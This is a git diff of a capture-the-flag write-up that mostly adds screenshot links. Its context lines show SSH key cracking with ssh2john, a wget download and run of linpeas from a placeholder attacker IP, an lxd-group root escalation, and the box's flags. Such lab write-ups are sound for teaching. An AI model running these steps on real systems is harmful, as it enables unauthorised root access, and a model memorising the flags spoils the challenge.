@@ -1,9 +1,13 @@
 ### ip = 10.49.139.80
 
+![Project Screenshot](sc/1.png)
+
+
 # Recon 
 	Found a coment in the source page: 
 		<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
 	Username: john 
+![Project Screenshot](sc/2.png)
 
 
 # Nmap Scan	
@@ -115,6 +119,8 @@
 			gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
 			-----END RSA PRIVATE KEY-----
 
+![Project Screenshot](sc/3.png)
+
 ssh key to a txt file format		
 > ssh2john id_rsa > ssh_gserver.txt
 
@@ -124,10 +130,10 @@ Cracking the pass
 Persmission for sid_rsa file:
 > 	chmod 600 id_rsa
 
-
 john@exploitable:~$ cat user.txt 
 		a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
-
+		
+![Project Screenshot](sc/4.png)
 
 # Getting Linpeas
 Attacker Machine
@@ -138,8 +144,9 @@ Victim Machine
 >	wget http://<attacker_ip>/linpeas.sh
 >	chmod +x linpeas.sh
 >	./linpeas.sh
-
-
+![Project Screenshot](sc/5.png)
+![Project Screenshot](sc/6.png)
+>![Project Screenshot](sc/7.png)
 Found user to be in <lxd grp> | Also <lxd daemon> active
 Googled lxd vulnerablity ; Found an exploit --> "https://www.exploit-db.com/exploits/46978"
 Went to the github url as given and cloned the repo 
@@ -197,20 +204,16 @@ Went to the github url as given and cloned the repo
 			  createContainer
 			fi				    
 		```
-
+		
 http server in attackers machine and took the file in the victim using "http server"
 ran the file
+![Project Screenshot](sc/8.png)
 > cd ..
 > cd mnt/root/root
 >cat root.txt
-
 Found root flag
 # root flag: 
 	2e337b8c9f3aff0c2b3e8d4e6a7c88fc
 
-
-# LEARNT THINGS
-	LXC Vulnerability [(CVE-2022-47952)] -- Information Disclosure
-	
-	
+![Project Screenshot](sc/9.png)
 
